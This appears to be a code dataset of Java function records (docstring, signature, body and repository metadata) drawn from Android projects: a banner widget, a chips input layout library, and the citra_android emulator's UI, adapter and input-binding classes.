{"docstring": "/** \u8bbe\u7f6e\u662f\u5426\u663e\u793a\u6807\u9898,\u9ed8\u8ba4true */\n", "func_signal": "public T setTitleShow(boolean isTitleShow)", "code": "{\n    mTvTitle.setVisibility(isTitleShow ? VISIBLE : INVISIBLE);\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u6807\u9898\u6587\u5b57\u989c\u8272,\u9ed8\u8ba4\"#ffffff\" */\n", "func_signal": "public T setTextColor(int textColor)", "code": "{\n    mTvTitle.setTextColor(textColor);\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/**\n * Notifies {@link #mSelectionObservers} that a chip was unselected\n * in the data source.\n * @param chip {@link Chip} unselected\n */\n", "func_signal": "protected final void notifyChipUnselected(Chip chip)", "code": "{\n    if (mSelectionObservers != null) {\n        synchronized (this) {\n            for (SelectionObserver ob : mSelectionObservers) {\n                ob.onChipDeselected(chip);\n            }\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ObservableChipDataSource.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * When we have contact chips available, let's make them filterable in our ChipsInputView!\n */\n", "func_signal": "@Override\nprotected void onContactsAvailable(List<ContactChip> chips)", "code": "{\n    System.out.println(\"Number of contacts: \" + chips.size());\n    mChipsInput.setFilterableChipList(chips);\n}", "path": "app\\src\\main\\java\\com\\tylersuehr\\chipexample\\MainActivity.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Sets and stores a list of chips that are filterable and updates the\n * UI to enable the filterable RecyclerView accordingly.\n *\n * Note: this should only be called if you want the user to be able to\n * filter pre-existing (filterable chip list) chips.\n *\n * @param chips List of {@link Chip}\n */\n", "func_signal": "public void setFilterableChipList(List<? extends Chip> chips)", "code": "{\n    mDataSource.setFilterableChips(chips);\n\n    // Setup the filterable recycler when new\n    // filterable data has been set\n    loadFilterableRecycler();\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Used to detect IME option press on any type of input method.\n */\n", "func_signal": "@Override\npublic void onEditorAction(int actionCode)", "code": "{\n    if (mKeyboardListener != null && actionCode == EditorInfo.IME_ACTION_DONE) {\n        this.mKeyboardListener.onKeyboardActionDone(getText().toString());\n    }\n    super.onEditorAction(actionCode);\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsEditText.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Adds a new chip to the filterable chips, which will update the UI\n * accordingly because of the change observers.\n *\n * @param chip {@link Chip}\n */\n", "func_signal": "public void addFilteredChip(Chip chip)", "code": "{\n    // Ensure that the chip is actually filterable\n    chip.setFilterable(true);\n\n    // Ensure that the chip is not already in the data source\n    if (mDataSource.existsInDataSource(chip)) {\n        throw new IllegalArgumentException(\"Chip already exists in the data source!\");\n    }\n\n    // Using the method on data source will update UI\n    mDataSource.addFilteredChip(chip);\n\n    // Create the filterable recycler at this point, if needed\n    loadFilterableRecycler();\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Gets a filtered chip with exactly the given subtitle or like the given subtitle.\n *\n * @param subtitle Subtitle to search for\n * @param exactlyEqual True if filtered chip subtitle should exactly match subtitle\n * @return {@link Chip}\n */\n", "func_signal": "public Chip getFilteredChipBySubtitle(String subtitle, boolean exactlyEqual)", "code": "{\n    for (Chip chip : mDataSource.getFilteredChips()) {\n        if (chip.getSubtitle() == null) { continue; }\n        if ((exactlyEqual && chip.getSubtitle().equals(subtitle)) ||\n                (!exactlyEqual && chip.getSubtitle().toLowerCase().contains(subtitle.toLowerCase()))) {\n            return chip;\n        }\n    }\n    return null;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Creates a custom Bitmap containing a letter, digit, or default image (if no letter\n * or digit can be resolved), positioned at the center, with a randomized background\n * color, picked from {@link #colors}, based on the hashed value of the given string.\n *\n * @param displayName Any string value\n * @return {@link Bitmap}\n */\n", "func_signal": "public Bitmap getLetterTile(String displayName)", "code": "{\n    // Don't allow empty strings\n    if (displayName == null || displayName.length() == 0) { return null; }\n\n    final char firstChar = displayName.charAt(0);\n\n    // Create a Bitmap with the width & height specified from resources\n    final Bitmap bitmap = Bitmap.createBitmap(tileSize, tileSize, Bitmap.Config.ARGB_8888);\n\n    // Setup our canvas for drawing\n    final Canvas c = canvas;\n    c.setBitmap(bitmap);\n    c.drawColor(pickColor(displayName));\n\n    // We want to use the default Bitmap if our character is not a letter or digit\n    if (Character.isLetterOrDigit(firstChar)) {\n        this.firstChar[0] = Character.toUpperCase(firstChar);\n\n        // Set the paint text size as half the bitmap's height\n        this.paint.setTextSize(tileSize >> 1);\n\n        // Measure the bounds of our first character\n        this.paint.getTextBounds(this.firstChar, 0, 1, bounds);\n\n        // Draw the character on the Canvas\n        c.drawText(this.firstChar, 0, 1,\n                tileSize / 2,\n                tileSize / 2 + (bounds.bottom - bounds.top) / 2,\n                paint);\n    } else {\n        // (32 - 24) / 2 = 4\n        final float density = Resources.getSystem().getDisplayMetrics().density;\n        final float defSize = (4f * density);\n        c.drawBitmap(defaultBitmap, defSize, defSize, null);\n    }\n\n    return bitmap;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\LetterTileProvider.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Gets a selected chip using the given ID, if possible.\n *\n * @param id ID of the selected chip\n * @return {@link Chip}\n */\n", "func_signal": "public Chip getSelectedChipById(Object id)", "code": "{\n    for (Chip chip : mDataSource.getSelectedChips()) {\n        if (chip.getId() != null && chip.getId().equals(id)) {\n            return chip;\n        }\n    }\n    return null;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Adds a new chip to the selected chips, which will update the UI\n * accordingly because of the change observers.\n *\n * @param chip {@link Chip}\n */\n", "func_signal": "public void addSelectedChip(Chip chip)", "code": "{\n    // Ensure that the chip is not already in the data source\n    if (mDataSource.existsInDataSource(chip)) {\n        throw new IllegalArgumentException(\"Chip already exists in the data source!\");\n    }\n\n    // Using the method on data source will update UI\n    mDataSource.addSelectedChip(chip);\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Gets a selected chip with exactly the given title or like the given title.\n *\n * @param title Title to search for\n * @param exactlyEqual True if chip title should exactly match title\n * @return {@link Chip}\n */\n", "func_signal": "public Chip getSelectedChipByTitle(String title, boolean exactlyEqual)", "code": "{\n    for (Chip chip : mDataSource.getSelectedChips()) {\n        if ((exactlyEqual && chip.getTitle().equals(title)) ||\n                (!exactlyEqual && chip.getTitle().toLowerCase().contains(title.toLowerCase()))) {\n            return chip;\n        }\n    }\n    return null;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Creates a circular Bitmap by drawing a circle and then the given\n * Bitmap in the center.\n *\n * @param bitmap {@link Bitmap}\n * @return {@link Bitmap}\n */\n", "func_signal": "private Bitmap getCircularBitmap(Bitmap bitmap)", "code": "{\n    Bitmap output;\n\n    final int smallestSize = Math.min(bitmap.getWidth(), bitmap.getHeight());\n    output = Bitmap.createBitmap(smallestSize, smallestSize, Bitmap.Config.ARGB_8888);\n\n    Canvas canvas = new Canvas(output);\n\n    final int color = 0xff424242;\n    final Paint paint = new Paint();\n    final Rect rect = new Rect(0, 0, bitmap.getWidth(), bitmap.getHeight());\n\n    float r = smallestSize / 2;\n\n    paint.setAntiAlias(true);\n    canvas.drawARGB(0, 0, 0, 0); // Draw the entire bitmap transparent\n    paint.setColor(color);\n    canvas.drawCircle(r, r, r, paint);\n    paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));\n    canvas.drawBitmap(bitmap, rect, rect, paint);\n    return output;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\LetterTileProvider.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Gets a selected chip with exactly the given subtitle or like the given subtitle.\n *\n * @param subtitle Subtitle to search for\n * @param exactlyEqual True if chip subtitle should exactly match subtitle\n * @return {@link Chip}\n */\n", "func_signal": "public Chip getSelectedChipBySubtitle(String subtitle, boolean exactlyEqual)", "code": "{\n    for (Chip chip : mDataSource.getSelectedChips()) {\n        if (chip.getSubtitle() == null) { continue; }\n        if ((exactlyEqual && chip.getSubtitle().equals(subtitle)) ||\n                (!exactlyEqual && chip.getSubtitle().toLowerCase().contains(subtitle.toLowerCase()))) {\n            return chip;\n        }\n    }\n    return null;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Notifies {@link #mSelectionObservers} that a chip was selected\n * in the data source.\n * @param chip {@link Chip} selected\n */\n", "func_signal": "protected final void notifyChipSelected(Chip chip)", "code": "{\n    if (mSelectionObservers != null) {\n        synchronized (this) {\n            for (SelectionObserver ob : mSelectionObservers) {\n                ob.onChipSelected(chip);\n            }\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ObservableChipDataSource.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Randomly picks one of the colors in {@link #colors} using an algorithm based\n * on the hashed value of the given key.\n *\n * This is consistent because String.hashCode() is guaranteed to not change across\n * Java versions, which implicates that the same key always maps to the same color.\n *\n * @param key Any string value\n * @return {@link android.support.annotation.ColorInt}\n */\n", "func_signal": "private int pickColor(String key)", "code": "{\n    final int whichColor = Math.abs(key.hashCode()) % colors.length;\n    return Color.parseColor(colors[whichColor]);\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\LetterTileProvider.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Sets and stores a list of chips that are selected and updates the UI\n * to display them accordingly.\n *\n * @param chips List of {@link Chip}\n */\n", "func_signal": "public void setSelectedChipList(List<? extends Chip> chips)", "code": "{\n    // Set the selected chips in the data source\n    mDataSource.getSelectedChips().clear();\n    mDataSource.getSelectedChips().addAll(chips);\n\n    // Update the chips UI display\n    mChipsAdapter.notifyDataSetChanged();\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Validates all the selected chips using {@link #mValidator}.\n *\n * @return True if all selected chips are valid, or no chip mValidator is set\n */\n", "func_signal": "public boolean validateSelectedChips()", "code": "{\n    if (mValidator != null) {\n        for (Chip chip : mDataSource.getSelectedChips()) {\n            if (!mValidator.validate(chip)) {\n                return false;\n            }\n        }\n    }\n    return true;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Changes the chip data source being used to manipulate chips, which will\n * update the UI accordingly.\n *\n * Note: will retain existing observers from old data source, but all chips\n * in the old data source will be cleared!\n *\n * @param dataSource {@link ChipDataSource}\n */\n", "func_signal": "public void changeChipDataSource(ChipDataSource dataSource)", "code": "{\n    mDataSource.cloneObservers(dataSource);\n    mDataSource = dataSource;\n    mChipsAdapter.notifyDataSetChanged();\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Notifies {@link #mChangeObservers} that a change to the data\n * source happened.\n */\n", "func_signal": "protected final void notifyDataSourceChanged()", "code": "{\n    if (mChangeObservers != null) {\n        synchronized (this) {\n            for (ChangeObserver ob : mChangeObservers) {\n                ob.onChipDataSourceChanged();\n            }\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ObservableChipDataSource.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Gets a filtered chip with exactly the given title or like the given title.\n *\n * @param title Title to search for\n * @param exactlyEqual True if filtered chip title should exactly match title\n * @return {@link Chip}\n */\n", "func_signal": "public Chip getFilteredChipByTitle(String title, boolean exactlyEqual)", "code": "{\n    for (Chip chip : mDataSource.getFilteredChips()) {\n        if ((exactlyEqual && chip.getTitle().equals(title)) ||\n                (!exactlyEqual && chip.getTitle().toLowerCase().contains(title.toLowerCase()))) {\n            return chip;\n        }\n    }\n    return null;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "/**\n * Gets a filtered chip using the given ID, if possible.\n *\n * @param id Filtered chip's ID\n * @return {@link Chip}\n */\n", "func_signal": "public Chip getFilteredChipById(Object id)", "code": "{\n    for (Chip chip : mDataSource.getFilteredChips()) {\n        if (chip.getId() != null && chip.getId().equals(id)) {\n            return chip;\n        }\n    }\n    return null;\n}", "path": "library\\src\\main\\java\\com\\tylersuehr\\chips\\ChipsInputLayout.java", "repo_name": "tylersuehr7/chips-input-layout", "stars": 585, "license": "mit", "language": "java", "size": 13290}
{"docstring": "// TODO: Replace with a ButterKnife injection.\n", "func_signal": "private void findViews()", "code": "{\n  mToolbar = findViewById(R.id.toolbar_main);\n  mFab = findViewById(R.id.button_add_directory);\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\ui\\main\\MainActivity.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "// Surface callbacks\n", "func_signal": "public synchronized void newSurface(Surface surface)", "code": "{\n  mSurface = surface;\n  if (mRunWhenSurfaceIsValid)\n  {\n    runWithValidSurface();\n  }\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\fragments\\EmulationFragment.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Return the contents of the _id column for a given row.\n *\n * @param position The row for which Android wants an ID.\n * @return A valid ID from the database, or 0 if not available.\n */\n", "func_signal": "@Override\npublic long getItemId(int position)", "code": "{\n  if (mDatasetValid && mCursor != null)\n  {\n    if (mCursor.moveToPosition(position))\n    {\n      return mCursor.getLong(GameDatabase.COLUMN_DB_ID);\n    }\n  }\n\n  Log.error(\"[GameAdapter] Dataset is not valid.\");\n  return 0;\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * When a load is finished, call this to replace the existing data with the newly-loaded\n * data.\n *\n * @param cursor The newly-loaded Cursor.\n */\n", "func_signal": "public void swapCursor(Cursor cursor)", "code": "{\n  // Sanity check.\n  if (cursor == mCursor)\n  {\n    return;\n  }\n\n  // Before getting rid of the old cursor, disassociate it from the Observer.\n  final Cursor oldCursor = mCursor;\n  if (oldCursor != null && mObserver != null)\n  {\n    oldCursor.unregisterDataSetObserver(mObserver);\n  }\n\n  mCursor = cursor;\n  if (mCursor != null)\n  {\n    // Attempt to associate the new Cursor with the Observer.\n    if (mObserver != null)\n    {\n      mCursor.registerDataSetObserver(mObserver);\n    }\n\n    mDatasetValid = true;\n  }\n  else\n  {\n    mDatasetValid = false;\n  }\n\n  notifyDataSetChanged();\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Initializes the adapter's observer, which watches for changes to the dataset. The adapter will\n * display no data until a Cursor is supplied by a CursorLoader.\n */\n", "func_signal": "public GameAdapter()", "code": "{\n  mDatasetValid = false;\n  mObserver = new GameDataSetObserver();\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * This version of onAttach is needed for versions below Marshmallow.\n *\n * @param activity\n */\n", "func_signal": "@Override\npublic void onAttach(Activity activity)", "code": "{\n\tsuper.onAttach(activity);\n\n\tmActivity = (SettingsActivityView) activity;\n\tmPresenter.onAttach();\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\ui\\settings\\SettingsFragment.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Called by the LayoutManager to find out how much data we have.\n *\n * @return Size of the dataset.\n */\n", "func_signal": "@Override\npublic int getItemCount()", "code": "{\n  if (mDatasetValid && mCursor != null)\n  {\n    return mCursor.getCount();\n  }\n  Log.error(\"[GameAdapter] Dataset is not valid.\");\n  return 0;\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Launches the game that was clicked on.\n *\n * @param view The card representing the game the user wants to play.\n */\n", "func_signal": "@Override\npublic void onClick(View view)", "code": "{\n  GameViewHolder holder = (GameViewHolder) view.getTag();\n\n  EmulationActivity.launch((FragmentActivity) view.getContext(),\n          holder.path,\n          holder.title,\n          holder.screenshotPath,\n          holder.getAdapterPosition(),\n          holder.imageScreenshot);\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Constructor\n *\n * @param res                             {@link Resources} instance.\n * @param defaultStateBitmap              {@link Bitmap} of the default state.\n * @param pressedOneDirectionStateBitmap  {@link Bitmap} of the pressed state in one direction.\n * @param pressedTwoDirectionsStateBitmap {@link Bitmap} of the pressed state in two direction.\n * @param buttonUp                        Identifier for the up button.\n * @param buttonDown                      Identifier for the down button.\n * @param buttonLeft                      Identifier for the left button.\n * @param buttonRight                     Identifier for the right button.\n */\n", "func_signal": "public InputOverlayDrawableDpad(Resources res,\n        Bitmap defaultStateBitmap,\n        Bitmap pressedOneDirectionStateBitmap,\n        Bitmap pressedTwoDirectionsStateBitmap,\n        int buttonUp, int buttonDown,\n        int buttonLeft, int buttonRight)", "code": "{\n  mDefaultStateBitmap = new BitmapDrawable(res, defaultStateBitmap);\n  mPressedOneDirectionStateBitmap = new BitmapDrawable(res, pressedOneDirectionStateBitmap);\n  mPressedTwoDirectionsStateBitmap = new BitmapDrawable(res, pressedTwoDirectionsStateBitmap);\n\n  mWidth = mDefaultStateBitmap.getIntrinsicWidth();\n  mHeight = mDefaultStateBitmap.getIntrinsicHeight();\n\n  mButtonType[0] = buttonUp;\n  mButtonType[1] = buttonDown;\n  mButtonType[2] = buttonLeft;\n  mButtonType[3] = buttonRight;\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\overlay\\InputOverlayDrawableDpad.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Constructor\n *\n * @param context The current {@link Context}.\n * @param setting The Preference to show this dialog for.\n */\n", "func_signal": "public MotionAlertDialog(Context context, InputBindingSetting setting)", "code": "{\n  super(context);\n\n  this.setting = setting;\n  this.mControllerMappingHelper = new ControllerMappingHelper();\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\dialogs\\MotionAlertDialog.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Write a value to the backing string. If that string was previously null,\n * initializes a new one and returns it, so it can be added to the Hashmap.\n *\n * @param bind The input that will be bound\n * @return null if overwritten successfully; otherwise, a newly created StringSetting.\n */\n", "func_signal": "public StringSetting setValue(String bind)", "code": "{\n  if (getSetting() == null)\n  {\n    StringSetting setting = new StringSetting(getKey(), getSection(), getFile(), bind);\n    setSetting(setting);\n    return setting;\n  }\n  else\n  {\n    StringSetting setting = (StringSetting) getSetting();\n    setting.setValue(bind);\n    return null;\n  }\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\model\\settings\\view\\InputBindingSetting.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Called by the LayoutManager when a new view is not necessary because we can recycle\n * an existing one (for example, if a view just scrolled onto the screen from the bottom, we\n * can use the view that just scrolled off the top instead of inflating a new one.)\n *\n * @param holder   A ViewHolder representing the view we're recycling.\n * @param position The position of the 'new' view in the dataset.\n */\n", "func_signal": "@Override\npublic void onBindViewHolder(GameViewHolder holder, int position)", "code": "{\n  if (mDatasetValid)\n  {\n    if (mCursor.moveToPosition(position))\n    {\n      String screenPath = mCursor.getString(GameDatabase.GAME_COLUMN_SCREENSHOT_PATH);\n      PicassoUtils.loadGameBanner(holder.imageScreenshot, screenPath,\n              mCursor.getString(GameDatabase.GAME_COLUMN_PATH));\n\n      holder.textGameTitle.setText(mCursor.getString(GameDatabase.GAME_COLUMN_TITLE));\n      holder.textCompany.setText(mCursor.getString(GameDatabase.GAME_COLUMN_COMPANY));\n\n      // TODO These shouldn't be necessary once the move to a DB-based model is complete.\n      holder.gameId = mCursor.getString(GameDatabase.GAME_COLUMN_GAME_ID);\n      holder.path = mCursor.getString(GameDatabase.GAME_COLUMN_PATH);\n      holder.title = mCursor.getString(GameDatabase.GAME_COLUMN_TITLE);\n      holder.description = mCursor.getString(GameDatabase.GAME_COLUMN_DESCRIPTION);\n      holder.country = mCursor.getInt(GameDatabase.GAME_COLUMN_COUNTRY);\n      holder.company = mCursor.getString(GameDatabase.GAME_COLUMN_COMPANY);\n      holder.screenshotPath = mCursor.getString(GameDatabase.GAME_COLUMN_SCREENSHOT_PATH);\n    }\n    else\n    {\n      Log.error(\"[GameAdapter] Can't bind view; Cursor is not valid.\");\n    }\n  }\n  else\n  {\n    Log.error(\"[GameAdapter] Can't bind view; dataset is not valid.\");\n  }\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Called by the LayoutManager when it is necessary to create a new view.\n *\n * @param parent   The RecyclerView (I think?) the created view will be thrown into.\n * @param viewType Not used here, but useful when more than one type of child will be used in the RecyclerView.\n * @return The created ViewHolder with references to all the child view's members.\n */\n", "func_signal": "@Override\npublic GameViewHolder onCreateViewHolder(ViewGroup parent, int viewType)", "code": "{\n  // Create a new view.\n  View gameCard = LayoutInflater.from(parent.getContext())\n          .inflate(R.layout.card_game, parent, false);\n\n  gameCard.setOnClickListener(this);\n\n  // Use that view to create a ViewHolder.\n  return new GameViewHolder(gameCard);\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\adapters\\GameAdapter.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Save the input string to settings and SharedPreferences, then dismiss this Dialog.\n */\n", "func_signal": "private void saveInput(String bind, String ui)", "code": "{\n  setting.setValue(bind);\n\n  SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getContext());\n  SharedPreferences.Editor editor = preferences.edit();\n\n  editor.putString(setting.getKey(), ui);\n  editor.apply();\n\n  dismiss();\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\dialogs\\MotionAlertDialog.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Initialize the UI and start emulation in here.\n */\n", "func_signal": "@Override\npublic View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)", "code": "{\n  View contents = inflater.inflate(R.layout.fragment_emulation, container, false);\n\n  SurfaceView surfaceView = contents.findViewById(R.id.surface_emulation);\n  surfaceView.getHolder().addCallback(this);\n\n  mInputOverlay = contents.findViewById(R.id.surface_input_overlay);\n  if (mInputOverlay != null)\n  {\n    // If the input overlay was previously disabled, then don't show it.\n    if (!mPreferences.getBoolean(\"showInputOverlay\", true))\n    {\n      mInputOverlay.setVisibility(View.GONE);\n    }\n  }\n\n  Button doneButton = contents.findViewById(R.id.done_control_config);\n  if (doneButton != null)\n  {\n    doneButton.setOnClickListener(v -> stopConfiguringControls());\n  }\n\n  mPerfStats = contents.findViewById(R.id.perf_stats_text);\n  if (mPerfStats != null)\n  {\n    // If the overlay was previously disabled, then don't show it.\n    if (!mPreferences.getBoolean(\"showPerfStats\", true))\n    {\n      mPerfStats.setVisibility(View.GONE);\n    }\n    else\n    {\n      updatePerfStats();\n    }\n  }\n\n  // The new Surface created here will get passed to the native code via onSurfaceChanged.\n\n  return contents;\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\fragments\\EmulationFragment.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Base constructor.\n *\n * @param key     Everything to the left of the = in a line from the ini file.\n * @param section The corresponding recent section header; e.g. [Core] or [Enhancements] without the brackets.\n * @param file    The ini file the Setting is stored in.\n */\n", "func_signal": "public Setting(String key, String section, int file)", "code": "{\n  mKey = key;\n  mSection = section;\n  mFile = file;\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\model\\settings\\Setting.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "// State changing methods\n", "func_signal": "public synchronized void stop()", "code": "{\n  if (state != State.STOPPED)\n  {\n    Log.debug(\"[EmulationFragment] Stopping emulation.\");\n    state = State.STOPPED;\n    NativeLibrary.StopEmulation();\n  }\n  else\n  {\n    Log.warning(\"[EmulationFragment] Stop called while already stopped.\");\n  }\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\fragments\\EmulationFragment.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Saves the provided key input setting both to the INI file (so native code can use it) and as\n * an Android preference (so it persists correctly and is human-readable.)\n *\n * @param keyEvent KeyEvent of this key press.\n */\n", "func_signal": "private void saveKeyInput(KeyEvent keyEvent)", "code": "{\n  InputDevice device = keyEvent.getDevice();\n  String bindStr = \"Device '\" + device.getDescriptor() + \"'-Button \" + keyEvent.getKeyCode();\n  String uiString = device.getName() + \": Button \" + keyEvent.getKeyCode();\n\n  saveInput(bindStr, uiString);\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\dialogs\\MotionAlertDialog.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "/**\n * Initialize anything that doesn't depend on the layout / views in here.\n */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n  super.onCreate(savedInstanceState);\n\n  // So this fragment doesn't restart on configuration changes; i.e. rotation.\n  setRetainInstance(true);\n\n  mPreferences = PreferenceManager.getDefaultSharedPreferences(getActivity());\n\n  String gamePath = getArguments().getString(KEY_GAMEPATH);\n  mEmulationState = new EmulationState(gamePath);\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\fragments\\EmulationFragment.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
